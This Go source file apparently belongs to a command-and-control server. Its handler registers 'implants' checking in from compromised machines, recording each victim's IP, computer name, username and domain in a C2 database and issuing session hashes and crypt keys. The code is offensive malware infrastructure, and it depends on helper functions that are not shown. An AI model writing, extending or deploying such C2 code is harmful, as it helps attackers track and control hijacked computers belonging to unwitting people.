package main

import (
	"crypto/md5"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"time"
)

type Session struct {
	Sessionid   int
	Sessionhash string
	Implanttype string
	Ip          string
	Compname    string
	Username    string
	Domain      string
	Cryptkey    string
}

func register(w http.ResponseWriter, r *http.Request) {

	encodedData := r.FormValue("data")
	data, err := base64.StdEncoding.DecodeString(encodedData)
	if err != nil {

		fmt.Printf("Error Decoding Registeration Info: %v", err)
		return

	}

	var session Session
	json.Unmarshal([]byte(data), &session)

	session.Sessionid = qRows(db)
	ip, port, err := net.SplitHostPort(r.RemoteAddr)
	userIP := net.ParseIP(ip)
	session.Ip = userIP.String()

	h := md5.New()
	h.Write([]byte(session.Compname + fmt.Sprintf("%d", time.Now().Unix())))
	sessionhash := h.Sum(nil)
	session.Sessionhash = hex.EncodeToString(sessionhash)

	// crypt key
	s := session.Implanttype + session.Username + session.Compname + fmt.Sprintf("%d", time.Now().Unix())
	h1 := sha1.New()
	h1.Write([]byte(s))
	bs := h1.Sum(nil)
	session.Cryptkey = hex.EncodeToString(bs)

	// This location will be used to actually add values to the c2 database

	check := registerer(db, session)

	if check != true {

		fmt.Println("[!] Unable to register new session")
		return

	} else {
		fmt.Println("[+] Registered new session from: ", session.Ip, ":", port)
	}

	session.Sessionid = 0 // stripping sessionid from response just in case
	outbound, err := json.Marshal(session)
	if err != nil {

		fmt.Println("[!] Could not properly serialize session object")
		return

	}

	// maybe add basic encryption here?

	retData := base64.StdEncoding.EncodeToString([]byte(outbound))
	fmt.Fprintf(w, retData)

}
